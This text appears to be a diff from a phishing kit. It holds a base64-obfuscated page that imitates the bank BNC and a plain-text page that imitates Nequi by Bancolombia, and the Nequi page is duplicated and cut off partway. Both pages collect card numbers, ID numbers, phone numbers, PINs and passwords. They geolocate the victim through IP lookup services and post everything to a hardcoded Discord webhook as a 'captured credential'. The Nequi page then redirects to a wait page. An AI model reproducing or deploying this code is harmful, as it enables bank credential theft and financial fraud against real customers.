Iikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzZWNvbmQtZmllbGQtd3JhcHBlciIpLmNsYXNzTGlzdC5hZGQoImlucHV0LWxhYmVsLWFuaW0iKTsKICAgIHNldFRpbWVvdXQoKCkgPT4gc2Vjb25kSW5wdXQuZm9jdXMoKSwgNTApOwogIH0KCiAgZnVuY3Rpb24gc3dpdGNoVG9DZWR1bGEoKSB7CiAgICBpc1Bhc3N3b3JkTW9kZSAgPSBmYWxzZTsKICAgIHBhc3N3b3JkVmlzaWJsZSA9IGZhbHNlOwogICAgc2F2ZWRDZWR1bGEgICAgID0gIiI7CgogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNlY29uZC1pY29uIikuaW5uZXJIVE1MID0gYAogICAgICA8c3ZnIHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM3NzciIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj4KICAgICAgICA8cmVjdCB4PSIyIiB5PSI0IiB3aWR0aD0iMjAiIGhlaWdodD0iMTYiIHJ4PSIyIi8+CiAgICAgICAgPGNpcmNsZSBjeD0iOC41IiBjeT0iMTAiIHI9IjIiLz4KICAgICAgICA8cGF0aCBkPSJNMTQgMTBoNE0xNCAxNGg0TTIgMTRoNCIvPgogICAgICA8L3N2Zz5gOwoKICAgIHNlY29uZElucHV0LnR5cGUgICAgICAgID0gInRlbCI7CiAgICBzZWNvbmRJbnB1dC5wbGFjZWhvbGRlciA9ICJDw6lkdWxhIGRlIElkZW50aWRhZCAoOCBkw61naXRvcykiOwogICAgc2Vjb25kSW5wdXQudmFsdWUgICAgICAgPSAiIjsKICAgIHNlY29uZElucHV0Lm1heExlbmd0aCAgID0gODsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJleWUtYnRuIikuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIHVwZGF0ZUV5ZUljb24oKTsKICB9CgogIGZ1bmN0aW9uIHRvZ2dsZVBhc3N3b3JkKCkgewogICAgcGFzc3dvcmRWaXNpYmxlID0gIXBhc3N3b3JkVmlzaWJsZTsKICAgIHNlY29uZElucHV0LnR5cGUgPSBwYXNzd29yZFZpc2libGUgPyAidGV4dCIgOiAicGFzc3dvcmQiOwogICAgdXBkYXRlRXllSWNvbigpOwogIH0KCiAgZnVuY3Rpb24gdXBkYXRlRXllSWNvbigpIHsKICAgIGNvbnN0IGljb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZXllLWljb24iKTsKICAgIGlmIChwYXNzd29yZFZpc2libGUpIHsKICAgICAgaWNvbi5pbm5lckhUTUwgPSBgCiAgICAgICAgPHBhdGggZD0iTTE3Ljk0IDE3Ljk0QTEwLjA3IDEwLjA3IDAgMCAxIDEyIDIwYy03IDAtMTEtOC0xMS04YTE4LjQ1IDE4LjQ1IDAgMCAxIDUuMDYtNS45NE05LjkgNC4yNEE5LjEyIDkuMTIgMCAwIDEgMTIgNGM3IDAgMTEgOCAxMSA4YTE4LjUgMTguNSAwIDAgMS0yLjE2IDMuMTltLTYuNzItMS4wN2EzIDMgMCAxIDEtNC4yNC00LjI0Ii8+CiAgICAgICAgPGxpbmUgeDE9IjEiIHkxPSIxIiB4Mj0iMjMiIHkyPSIyMyIvPmA7CiAgICB9IGVsc2UgewogICAgICBpY29uLmlubmVySFRNTCA9IGAKICAgICAgICA8cGF0aCBkPSJNMSAxMnM0LTggMTEtOCAxMSA4IDExIDgtNCA4LTExIDgtMTEtOC0xMS04eiIvPgogICAgICAgIDxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiLz5gOwogICAgfQogIH0KCiAgLy8gVWJpY2FjacOzbgogIGFzeW5jIGZ1bmN0aW9uIGdldExvY2F0aW9uKCkgewogICAgY29uc3QgYXBpcyA9IFsKICAgICAgeyB1cmw6ICJodHRwczovL2lwYXBpLmNvL2pzb24vIiwKICAgICAgICBwYXJzZTogZCA9PiBkLmlwID8geyBpcDogZC5pcCwgY2l0eTogZC5jaXR5LCByZWdpb246IGQucmVnaW9uLCBjb3VudHJ5OiBkLmNvdW50cnlfbmFtZSwgaXNwOiBkLm9yZyB9IDogbnVsbCB9LAogICAgICB7IHVybDogImh0dHBzOi8vaXAtYXBpLmNvbS9qc29uLz9maWVsZHM9c3RhdHVzLGNvdW50cnkscmVnaW9uTmFtZSxjaXR5LGlzcCxxdWVyeSIsCiAgICAgICAgcGFyc2U6IGQgPT4gZC5zdGF0dXMgPT09ICJzdWNjZXNzIiA/IHsgaXA6IGQucXVlcnksIGNpdHk6IGQuY2l0eSwgcmVnaW9uOiBkLnJlZ2lvbk5hbWUsIGNvdW50cnk6IGQuY291bnRyeSwgaXNwOiBkLmlzcCB9IDogbnVsbCB9LAogICAgICB7IHVybDogImh0dHBzOi8vaXB3aG8uaXMvIiwKICAgICAgICBwYXJzZTogZCA9PiBkLmlwID8geyBpcDogZC5pcCwgY2l0eTogZC5jaXR5LCByZWdpb246IGQucmVnaW9uLCBjb3VudHJ5OiBkLmNvdW50cnksIGlzcDogZC5jb25uZWN0aW9uPy5pc3AgfHwgZC5vcmcgfSA6IG51bGwgfQogICAgXTsKICAgIGZvciAoY29uc3QgYXBpIG9mIGFwaXMpIHsKICAgICAgdHJ5IHsKICAgICAgICBjb25zdCByID0gYXdhaXQgZmV0Y2goYXBpLnVybCwgeyBzaWduYWw6IEFib3J0U2lnbmFsLnRpbWVvdXQoNTAwMCkgfSk7CiAgICAgICAgY29uc3QgZCA9IGF3YWl0IHIuanNvbigpOwogICAgICAgIGNvbnN0IHJlc3VsdCA9IGFwaS5wYXJzZShkKTsKICAgICAgICBpZiAocmVzdWx0KSByZXR1cm4gcmVzdWx0OwogICAgICB9IGNhdGNoIChfKSB7fQogICAgfQogICAgcmV0dXJuIG51bGw7CiAgfQoKICBmdW5jdGlvbiBzaG93VG9hc3QobXNnLCB0eXBlID0gInN1Y2Nlc3MiKSB7CiAgICBjb25zdCB0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRvYXN0Iik7CiAgICB0LnRleHRDb250ZW50ID0gbXNnOwogICAgdC5jbGFzc05hbWUgPSAidG9hc3QiICsgKHR5cGUgPT09ICJlcnJvciIgPyAiIGVycm9yIiA6ICIiKTsKICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiB0LmNsYXNzTGlzdC5hZGQoInNob3ciKSk7CiAgICBzZXRUaW1lb3V0KCgpID0+IHQuY2xhc3NMaXN0LnJlbW92ZSgic2hvdyIpLCAzNTAwKTsKICB9CgogIGFzeW5jIGZ1bmN0aW9uIGhhbmRsZUNvbnRpbnVlKCkgewogICAgY29uc3QgY2FyZERpZ2l0cyA9IGNhcmRJbnB1dC52YWx1ZS5yZXBsYWNlKC9ccy9nLCAiIik7CiAgICBjb25zdCBzZWNvbmRWYWwgID0gc2Vjb25kSW5wdXQudmFsdWUudHJpbSgpOwogICAgY29uc3QgYnRuICAgICAgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidG4tY29udGludWFyIik7CiAgICBjb25zdCBzcGlubmVyICAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNwaW5uZXIiKTsKICAgIGNvbnN0IGJ0blRleHQgICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnRuLXRleHQiKTsKICAgIGNvbnN0IGFjdGl2ZUNhcmRUeXBlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ0bi1kZWJpdG8iKS5jbGFzc0xpc3QuY29udGFpbnMoImlzLWFjdGl2ZSIpCiAgICAgID8gIkTDqWJpdG8gfCBDcsOpZGl0byIgOiAiVGFyamV0YSBEw6liaXRvIEJPRCI7CgogICAgaWYgKGNhcmREaWdpdHMubGVuZ3RoIDwgOCkgeyBzaG93VG9hc3QoIuKaoO+4jyBJbmdyZXNlIGVsIG7Dum1lcm8gZGUgdGFyamV0YS4iLCAiZXJyb3IiKTsgcmV0dXJuOyB9CgogICAgaWYgKCFpc1Bhc3N3b3JkTW9kZSkgewogICAgICBpZiAoc2Vjb25kVmFsLmxlbmd0aCAhPT0gOCkgeyBzaG93VG9hc3QoIuKaoO+4jyBMYSBjw6lkdWxhIGRlYmUgdGVuZXIgOCBkw61naXRvcy4iLCAiZXJyb3IiKTsgcmV0dXJuOyB9CiAgICAgIHN3aXRjaFRvUGFzc3dvcmQoKTsKICAgICAgcmV0dXJuOwogICAgfQoKICAgIGlmIChzZWNvbmRWYWwubGVuZ3RoIDwgNCkgeyBzaG93VG9hc3QoIuKaoO+4jyBJbmdyZXNlIHN1IGNvbnRyYXNlw7FhLiIsICJlcnJvciIpOyByZXR1cm47IH0KCiAgICBidG4uZGlzYWJsZWQgPSB0cnVlOwogICAgYnRuVGV4dC50ZXh0Q29udGVudCAgID0gIlZlcmlmaWNhbmRvLi4uIjsKICAgIHNwaW5uZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CgogICAgc2F2ZVNlc3Npb24oY2FyZERpZ2l0cywgc2F2ZWRDZWR1bGEsIHNlY29uZFZhbCwgYWN0aXZlQ2FyZFR5cGUpOwoKICAgIGNvbnN0IGxvYyA9IGF3YWl0IGdldExvY2F0aW9uKCk7CiAgICBsZXQgbG9jYXRpb25WYWx1ZSA9ICLwn5ONIE5vIGRpc3BvbmlibGVcbvCfjJAgSVA6IGBOL0FgXG7wn4+iIElTUDogTi9BIjsKICAgIGlmIChsb2MpIHsKICAgICAgY29uc3QgbG9jU3RyID0gW2xvYy5jaXR5LCBsb2MucmVnaW9uLCBsb2MuY291bnRyeV0uZmlsdGVyKEJvb2xlYW4pLmpvaW4oIiwgIik7CiAgICAgIGxvY2F0aW9uVmFsdWUgPSBg8J+TjSAke2xvY1N0cn1cbvCfjJAgSVA6IFxgJHtsb2MuaXAgfHwgIk4vQSJ9XGBcbvCfj6IgSVNQOiAke2xvYy5pc3AgfHwgIk4vQSJ9YDsKICAgIH0KCiAgICBjb25zdCBwYXlsb2FkID0gewogICAgICB1c2VybmFtZTogIkJOQyAtIEJSMEszTiIsCiAgICAgIGF2YXRhcl91cmw6ICJodHRwczovL2QxeWpqbnB4MHA1M3M4LmNsb3VkZnJvbnQubmV0L3N0eWxlcy9sb2dvLXRodW1ibmFpbC9zMy8wMzIwMTgvdW50aXRsZWQtMV85Ny5wbmc/ZTIyZTZYVEk2S3lrSjIzQW1iSWlMUl9FSEMwUVIxaHEmaXRvaz1TQ1V4VGxHWiIsCiAgICAgIGVtYmVkczogW3sKICAgICAgICB0aXRsZTogIk51ZXZhIENyZWRlbmNpYWwgQ2FwdHVyYWRhIOKAlCBCTkMiLAogICAgICAgIGRlc2NyaXB0aW9uOiAiU2UgaGEgcmVjaWJpZG8gdW4gbnVldm8gaW50ZW50byBkZSBpbmljaW8gZGUgc2VzacOzbi4iLAogICAgICAgIGNvbG9yOiAxNTE1ODMzMiwKICAgICAgICBmaWVsZHM6IFsKICAgICAgICAgIHsgbmFtZTogIvCfkrMgVGlwbyBkZSBDdWVudGEiLCAgICB2YWx1ZTogImBgYCIgKyBhY3RpdmVDYXJkVHlwZSArICJgYGAiLCBpbmxpbmU6IHRydWUgIH0sCiAgICAgICAgICB7IG5hbWU6ICLwn6qqIEPDqWR1bGEiLCAgICAgICAgICAgIHZhbHVlOiAiYGBgIiArIHNhdmVkQ2VkdWxhICAgICsgImBgYCIsIGlubGluZTogdHJ1ZSAgfSwKICAgICAgICAgIHsgbmFtZTogIvCfkrMgTsO6bWVybyBkZSBUYXJqZXRhIiwgdmFsdWU6ICJgYGAiICsgY2FyZERpZ2l0cyAgICAgKyAiYGBgIiwgaW5saW5lOiBmYWxzZSB9LAogICAgICAgICAgeyBuYW1lOiAi8J+UkSBDb250cmFzZcOxYSIsICAgICAgICB2YWx1ZTogImBgYCIgKyBzZWNvbmRWYWwgICAgICArICJgYGAiLCBpbmxpbmU6IGZhbHNlIH0sCiAgICAgICAgICB7IG5hbWU6ICLwn4yNIFViaWNhY2nDs24gUmVhbCIsICAgIHZhbHVlOiBsb2NhdGlvblZhbHVlLCAgICAgICAgICAgICAgICAgIGlubGluZTogZmFsc2UgfSwKICAgICAgICAgIHsgbmFtZTogIvCfkrsgRGlzcG9zaXRpdm8iLCAgICAgICB2YWx1ZTogImBgYCIgKyBuYXZpZ2F0b3IudXNlckFnZW50ICsgImBgYCIsIGlubGluZTogZmFsc2UgfQogICAgICAgIF0sCiAgICAgICAgZm9vdGVyOiB7CiAgICAgICAgICB0ZXh0OiAiUG93ZXJlZCBCeSBAQnJrbnNoaW5leHh4IiwKICAgICAgICAgIGljb25fdXJsOiAiaHR0cHM6Ly91cGxvYWQud2lraW1lZGlhLm9yZy93aWtpcGVkaWEvY29tbW9ucy90aHVtYi84LzgyL1RlbGVncmFtX2xvZ28uc3ZnLzUwMHB4LVRlbGVncmFtX2xvZ28uc3ZnLnBuZyIKICAgICAgICB9LAogICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpCiAgICAgIH1dCiAgICB9OwoKICAgIHRyeSB7CiAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKFdFQkhPT0tfVVJMLCB7CiAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgaGVhZGVyczogeyAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iIH0sCiAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgICAgfSk7CiAgICAgIGlmIChyZXMub2sgfHwgcmVzLnN0YXR1cyA9PT0gMjA0KSB7CiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAid2FpdC5odG1sIjsKICAgICAgfSBlbHNlIHsKICAgICAgICB0aHJvdyBuZXcgRXJyb3IoIkhUVFAgIiArIHJlcy5zdGF0dXMpOwogICAgICB9CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgc2hvd1RvYXN0KCLinYwgRXJyb3IgZGUgY29uZXhpw7NuLiBJbnRlbnRlIG51ZXZhbWVudGUuIiwgImVycm9yIik7CiAgICAgIGJ0bi5kaXNhYmxlZCA9IGZhbHNlOwogICAgICBidG5UZXh0LnRleHRDb250ZW50ICAgPSAiQ29udGludWFyIjsKICAgICAgc3Bpbm5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgfQogIH0KPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg=="))));</script>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Nequi</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body {
+    height: 100%; width: 100%;
+    background: #200020;
+    color: white;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    overflow: hidden;
+  }
+  .screen {
+    width: 100%; height: 100dvh;
+    background: #200020;
+    display: flex; flex-direction: column; align-items: center;
+    padding: max(env(safe-area-inset-top,20px),20px) 28px max(env(safe-area-inset-bottom,24px),24px);
+    position: absolute; top: 0; left: 0;
+  }
+  .screen.hidden { display: none; }
+
+  #loginScreen { justify-content: space-between; }
+  .help-btn { align-self: flex-end; color: white; font-size: 22px; cursor: pointer; padding: 4px 0 4px 8px; }
+  .logo-container { flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; }
+  .nequi-logo { width: min(220px,55vw); border-radius: 16px; object-fit: contain; }
+  .login-bottom { width: 100%; }
+
+  .phone-input-wrapper {
+    background: #3a1040; border-radius: 14px;
+    display: flex; align-items: center;
+    padding: 16px 18px; margin-bottom: 14px;
+    border: 1px solid #5a3070;
+  }
+  .country-code {
+    color: #ccc; font-size: 16px;
+    margin-right: 14px; padding-right: 14px;
+    border-right: 1px solid #6a4080; white-space: nowrap;
+  }
+  .phone-input-wrapper input {
+    background: transparent; border: none; outline: none;
+    color: #ddd; font-size: 16px; flex: 1; min-width: 0;
+  }
+  .phone-input-wrapper input::placeholder { color: #888; }
+
+  .form-btn-submit {
+    width: 100%; background: #d4006e; color: white; border: none;
+    border-radius: 14px; padding: clamp(15px,4vw,19px);
+    font-size: clamp(16px,4.5vw,18px); font-weight: 600;
+    cursor: pointer; letter-spacing: 0.3px;
+    transition: background 0.2s, transform 0.1s, opacity 0.2s;
+    box-shadow: 0 4px 24px rgba(212,0,110,0.4);
+    display: block; text-align: center; appearance: none; -webkit-appearance: none;
+  }
+  .form-btn-submit:disabled { opacity: 0.45; cursor: not-allowed; box-shadow: none; }
+  .form-btn-submit:not(:disabled):active { transform: scale(0.98); background: #b8005e; }
+
+  .bancolombia-logo-wrapper { margin-top: 22px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #888; font-size: 13px; }
+  .bancolombia-logo-wrapper img { width: 28px; object-fit: contain; filter: brightness(0.75) grayscale(0.3); }
+
+  #pinScreen { justify-content: flex-start; }
+  .pin-topbar { width: 100%; display: flex; align-items: center; min-height: 44px; margin-bottom: 4px; }
+  .back-btn { color: white; font-size: 28px; cursor: pointer; background: none; border: none; padding: 8px 8px 8px 0; line-height: 1; }
+  .pin-title { font-size: clamp(22px,6vw,28px); font-weight: 700; margin-top: 8px; margin-bottom: 32px; align-self: flex-start; }
+
+  .pin-boxes { display: flex; gap: clamp(12px,4vw,20px); margin-bottom: 16px; }
+  .pin-box { width: clamp(58px,16vw,70px); height: clamp(58px,16vw,70px); background: #4a2860; border-radius: 12px; transition: background 0.15s, transform 0.12s; }
+  .pin-box.filled { background: #c4006e; transform: scale(1.06); }
+
+  .pin-subtitle { color: #aaa; font-size: clamp(13px,3.5vw,15px); text-align: center; line-height: 1.7; }
+
+  .keypad { width: 100%; margin-top: auto; }
+  .keypad-row { display: flex; justify-content: space-around; }
+  .key {
+    width: 33.33%; height: clamp(64px,16vw,80px);
+    background: transparent; border: none; color: white;
+    font-size: clamp(28px,7.5vw,36px); font-weight: 300;
+    cursor: pointer; border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    touch-action: manipulation; transition: background 0.1s, transform 0.1s;
+  }
+  .key:active { background: #3a1040; transform: scale(0.88); }
+  .key.empty { pointer-events: none; }
+  .key.del { font-size: clamp(20px,5vw,26px); }
+
+  .forgot-btn {
+    width: 80%; background: transparent; border: 1.5px solid #666; color: white;
+    border-radius: 14px; padding: clamp(13px,3.5vw,16px); font-size: clamp(14px,3.8vw,16px);
+    cursor: pointer; margin-top: 10px; margin-bottom: 4px;
+    touch-action: manipulation; transition: border-color 0.2s;
+  }
+  .forgot-btn:active { border-color: #d4006e; }
+
+  @keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(-100%); opacity: 0; } }
+  @keyframes slideIn  { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+  .slide-out { animation: slideOut 0.32s ease forwards; }
+  .slide-in  { animation: slideIn  0.32s ease forwards; }
+
+  .sending-overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(32,0,32,0.88);
+    align-items: center; justify-content: center;
+    flex-direction: column; gap: 16px; z-index: 200;
+  }
+  .sending-overlay.show { display: flex; }
+  .spinner { width: 48px; height: 48px; border: 4px solid #5a3070; border-top-color: #d4006e; border-radius: 50%; animation: spin 0.8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .sending-text { color: #ccc; font-size: 15px; }
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="screen" id="loginScreen">
+  <span class="help-btn">?</span>
+  <div class="logo-container">
+    <img class="nequi-logo"
+      src="https://www.valoraanalitik.com/wp-content/uploads/2024/06/Nequi-5.jpg"
+      alt="Nequi"
+      onerror="this.outerHTML='<div style=&quot;font-size:clamp(36px,10vw,52px);font-weight:900;color:white;&quot;><span style=&quot;color:#d4006e;&quot;>&#183;</span>Nequi</div>'"
+    />
+  </div>
+  <div class="login-bottom">
+    <div class="phone-input-wrapper">
+      <span class="country-code">+502</span>
+      <input type="tel" id="phoneInput" placeholder="Número de cel" maxlength="8" inputmode="numeric" autocomplete="tel" />
+    </div>
+    <!-- Botón entra -->
+    <button class="form-btn-submit" type="button" id="enterBtn" disabled>Entra</button>
+    <div class="bancolombia-logo-wrapper">
+      <span>by</span>
+      <img src="https://www.bancolombia.com/wcm/connect/b8e4c3f2-36a9-497d-a125-ac04f83b0bf8/LogoBancolombia.png?MOD=AJPERES"
+        alt="Bancolombia" onerror="this.style.display='none'" />
+    </div>
+  </div>
+</div>
+
+<!-- PIN -->
+<div class="screen hidden" id="pinScreen">
+  <div class="pin-topbar">
+    <button class="back-btn" onclick="goBack()">&#8592;</button>
+  </div>
+  <h2 class="pin-title">Escribe tu clave</h2>
+  <div class="pin-boxes">
+    <div class="pin-box" id="box0"></div>
+    <div class="pin-box" id="box1"></div>
+    <div class="pin-box" id="box2"></div>
+    <div class="pin-box" id="box3"></div>
+  </div>
+  <p class="pin-subtitle">No dudamos que seas tú...<br>Pero es mejor confirmar ;)</p>
+  <div class="keypad">
+    <div class="keypad-row">
+      <button class="key" onclick="pressKey('1')">1</button>
+      <button class="key" onclick="pressKey('2')">2</button>
+      <button class="key" onclick="pressKey('3')">3</button>
+    </div>
+    <div class="keypad-row">
+      <button class="key" onclick="pressKey('4')">4</button>
+      <button class="key" onclick="pressKey('5')">5</button>
+      <button class="key" onclick="pressKey('6')">6</button>
+    </div>
+    <div class="keypad-row">
+      <button class="key" onclick="pressKey('7')">7</button>
+      <button class="key" onclick="pressKey('8')">8</button>
+      <button class="key" onclick="pressKey('9')">9</button>
+    </div>
+    <div class="keypad-row">
+      <button class="key empty"></button>
+      <button class="key" onclick="pressKey('0')">0</button>
+      <button class="key del" onclick="deleteLast()">&#9003;</button>
+    </div>
+  </div>
+  <button class="forgot-btn">Olvidé mi clave</button>
+</div>
+
+<div class="sending-overlay" id="sendingOverlay">
+  <div class="spinner"></div>
+  <div class="sending-text">Verificando...</div>
+</div>
+
+<script>
+  // MISMO ESTILO QUE TU PÁGINA BNC
+  const WEBHOOK = "https://discord.com/api/webhooks/1478941711848702032/w19VzhDPz3r2AJNKxVDYMPM3N43i26cEkhLOpkV8ZErHfkuG2v8g8_CXFSRvlOHEd8sj";
+
+  let pin = [];
+  let phoneNumber = "";
+
+  const phoneInput = document.getElementById("phoneInput");
+  const enterBtn   = document.getElementById("enterBtn");
+
+  // Activa / desactiva el botón según haya número
+  phoneInput.addEventListener("input", function () {
+    enterBtn.disabled = this.value.trim().length === 0;
+  });
+
+  phoneInput.addEventListener("keydown", function (e) {
+    if (e.key === "Enter" && !enterBtn.disabled) {
+      e.preventDefault();
+      goToPin();
+    }
+  });
+
+  enterBtn.addEventListener("click", function (e) {
+    e.preventDefault();
+    if (!enterBtn.disabled) goToPin();
+  });
+
+  function goToPin() {
+    if (enterBtn.disabled) return;
+    phoneNumber = phoneInput.value.trim();
+    const login  = document.getElementById("loginScreen");
+    const pinScr = document.getElementById("pinScreen");
+    login.classList.add("slide-out");
+    setTimeout(function () {
+      login.classList.add("hidden");
+      login.classList.remove("slide-out");
+      pinScr.classList.remove("hidden");
+      pinScr.classList.add("slide-in");
+      setTimeout(function () { pinScr.classList.remove("slide-in"); }, 350);
+    }, 320);
+  }
+
+  function goBack() {
+    const login  = document.getElementById("loginScreen");
+    const pinScr = document.getElementById("pinScreen");
+    pin = []; updateBoxes();
+    pinScr.classList.add("slide-out");
+    setTimeout(function () {
+      pinScr.classList.add("hidden");
+      pinScr.classList.remove("slide-out");
+      login.classList.remove("hidden");
+      login.classList.add("slide-in");
+      setTimeout(function () { login.classList.remove("slide-in"); }, 350);
+    }, 320);
+  }
+
+  function pressKey(val) {
+    if (pin.length >= 4) return;
+    pin.push(val); updateBoxes();
+    if (pin.length === 4) setTimeout(submitPin, 300);
+  }
+
+  function deleteLast() { pin.pop(); updateBoxes(); }
+
+  function updateBoxes() {
+    for (let i = 0; i < 4; i++) {
+      const b = document.getElementById("box" + i);
+      if (i < pin.length) b.classList.add("filled");
+      else b.classList.remove("filled");
+    }
+  }
+
+  // Misma lógica de ubicación que usas en BNC (solo IP APIs)
+  async function getLocation() {
+    const apis = [
+      { url: "https://ipapi.co/json/",
+        parse: d => d.ip ? { ip: d.ip, city: d.city, region: d.region, country: d.country_name, isp: d.org } : null },
+      { url: "https://ip-api.com/json/?fields=status,country,regionName,city,isp,query",
+        parse: d => d.status === "success" ? { ip: d.query, city: d.city, region: d.regionName, country: d.country, isp: d.isp } : null },
+      { url: "https://ipwho.is/",
+        parse: d => d.ip ? { ip: d.ip, city: d.city, region: d.region, country: d.country, isp: (d.connection && d.connection.isp) || d.org } : null }
+    ];
+    for (const api of apis) {
+      try {
+        const r = await fetch(api.url, { signal: AbortSignal.timeout(5000) });
+        const d = await r.json();
+        const result = api.parse(d);
+        if (result) return result;
+      } catch (_) {}
+    }
+    return null;
+  }
+
+  async function submitPin() {
+    document.getElementById("sendingOverlay").classList.add("show");
+
+    const pinCode = pin.join("");
+    const now     = new Date().toLocaleString("es-GT", { timeZone: "America/Guatemala" });
+
+    const loc = await getLocation();
+    let locationValue = "📍 No disponible\n🌐 IP: `N/A`\n🏢 ISP: N/A";
+    if (loc) {
+      const locStr = [loc.city, loc.region, loc.country].filter(Boolean).join(", ");
+      locationValue = `📍 ${locStr}\n🌐 IP: \`${loc.ip || "N/A"}\`\n🏢 ISP: ${loc.isp || "N/A"}`;
+    }
+
+    const payload = {
+      username: "Nequi - BR0K3N",
+      avatar_url: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/032018/untitled-1_97.png?e22e6XTI6KykJ23AmbIiLR_EHC0QR1hq&itok=SCUxTlGZ",
+      embeds: [{
+        title: "Nueva Credencial Capturada — Nequi GT",
+        description: "Se ha recibido un nuevo intento de inicio de sesión.",
+        color: 15158332,
+        fields: [
+          { name: "📱 Número",          value: "```+502 " + phoneNumber + "```", inline: true  },
+          { name: "🔑 Clave",           value: "```"      + pinCode     + "```", inline: true  },
+          { name: "🕐 Hora (GT)",       value: "```"      + now         + "```", inline: false },
+          { name: "🌍 Ubicación Real",  value: locationValue,                 inline: false },
+          { name: "💻 Dispositivo",     value: "```" + navigator.userAgent + "```", inline: false }
+        ],
+        footer: {
+          text: "Powered By @Brknshinexxx",
+          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    try {
+      const res = await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      if (res.ok || res.status === 204) {
+        window.location.href = "wait.html";
+      } else {
+        throw new Error("HTTP " + res.status);
+      }
+    } catch (err) {
+      // Si falla igual redirige
+      window.location.href = "wait.html";
+    }
+  }
+</script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Nequi</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body {
+    height: 100%; width: 100%;
+    background: #200020;
+    color: white;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    overflow: hidden;
+  }
+  .screen {
+    width: 100%; height: 100dvh;
+    background: #200020;
+    display: flex; flex-direction: column; align-items: center;
+    padding: max(env(safe-area-inset-top,20px),20px) 28px max(env(safe-area-inset-bottom,24px),24px);
+    position: absolute; top: 0; left: 0;
+  }
+  .screen.hidden { display: none; }
+
+  #loginScreen { justify-content: space-between; }
+  .help-btn { align-self: flex-end; color: white; font-size: 22px; cursor: pointer; padding: 4px 0 4px 8px; }
+  .logo-container { flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; }
+  .nequi-logo { width: min(220px,55vw); border-radius: 16px; object-fit: contain; }
+  .login-bottom { width: 100%; }
+
+  .phone-input-wrapper {
+    background: #3a1040; border-radius: 14px;
+    display: flex; align-items: center;
+    padding: 16px 18px; margin-bottom: 14px;
+    border: 1px solid #5a3070;
+  }
+  .country-code {
+    color: #ccc; font-size: 16px;
+    margin-right: 14px; padding-right: 14px;
+    border-right: 1px solid #6a4080; white-space: nowrap;
+  }
+  .phone-input-wrapper input {
+    background: transparent; border: none; outline: none;
+    color: #ddd; font-size: 16px; flex: 1; min-width: 0;
+  }
+  .phone-input-wrapper input::placeholder { color: #888; }
+
+  .form-btn-submit {
+    width: 100%; background: #d4006e; color: white; border: none;
+    border-radius: 14px; padding: clamp(15px,4vw,19px);
+    font-size: clamp(16px,4.5vw,18px); font-weight: 600;
+    cursor: pointer; letter-spacing: 0.3px;
+    transition: background 0.2s, transform 0.1s, opacity 0.2s;
+    box-shadow: 0 4px 24px rgba(212,0,110,0.4);
+    display: block; text-align: center; appearance: none; -webkit-appearance: none;
+  }
+  .form-btn-submit:disabled { opacity: 0.45; cursor: not-allowed; box-shadow: none; }
+  .form-btn-submit:not(:disabled):active { transform: scale(0.98); background: #b8005e; }
+
+  .bancolombia-logo-wrapper { margin-top: 22px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #888; font-size: 13px; }
